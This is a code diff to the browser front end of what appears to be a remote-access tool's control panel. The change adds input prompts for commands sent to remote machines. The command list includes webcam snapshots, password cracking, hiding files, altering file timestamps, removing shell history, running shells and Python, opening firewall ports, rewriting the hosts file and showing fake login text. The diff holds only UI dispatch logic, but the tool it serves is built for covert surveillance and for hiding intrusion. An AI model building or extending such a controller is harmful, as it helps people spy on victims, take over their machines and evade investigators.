@@ -291,10 +291,46 @@ document.addEventListener('DOMContentLoaded', () => {
             const cmd = btn.dataset.cmd;
             const help = btn.dataset.help;
             
-            if (cmd === 'download' || cmd === 'upload' || cmd === 'cat') {
-                const path = prompt(`Enter file path for ${cmd}:`);
+            // Commands requiring file path or single parameter
+            const requiresPath = [
+                'download', 'upload', 'cat', 'more', 'touch', 'fileinfo', 
+                'hide', 'unhide', 'editaccessed', 'editcreated', 'editmodified', 
+                'cd', 'run', 'pyexec', 'sudo', 'shell', 'history_remove', 
+                'addkey', 'webcamsnap', 'crackpassword'
+            ];
+            
+            // Commands requiring text input
+            const requiresInput = [
+                'popup', 'logintext', 'hostsfile remove'
+            ];
+            
+            // Commands requiring multiple inputs (special handling)
+            const requiresMultiple = {
+                'listen': ['Port (default 4040)'],
+                'connect': ['Target IP', 'Port'],
+                'hostsfile update': ['Hostname', 'IP Address'],
+                'firewall open': ['Port', 'Direction (in/out)', 'Protocol (tcp/udp)'],
+                'firewall close': ['Port', 'Direction (in/out)', 'Protocol (tcp/udp)'],
+                'ssh': ['Username', 'Host', 'Password (optional)']
+            };
+            
+            if (requiresMultiple[cmd]) {
+                const inputs = [];
+                for (const field of requiresMultiple[cmd]) {
+                    const val = prompt(`Enter ${field}:`);
+                    if (val === null) return; // User cancelled
+                    inputs.push(val);
+                }
+                executeCommand(cmd, inputs.filter(v => v).join(' '));
+            } else if (requiresPath.includes(cmd) || cmd.includes('edit')) {
+                const path = prompt(`Enter file path or parameter for ${cmd}:`);
                 if (path) {
                     executeCommand(cmd, path);
+                }
+            } else if (requiresInput.includes(cmd)) {
+                const input = prompt(`Enter input for ${cmd}:`);
+                if (input) {
+                    executeCommand(cmd, input);
                 }
             } else {
                 executeCommand(cmd);
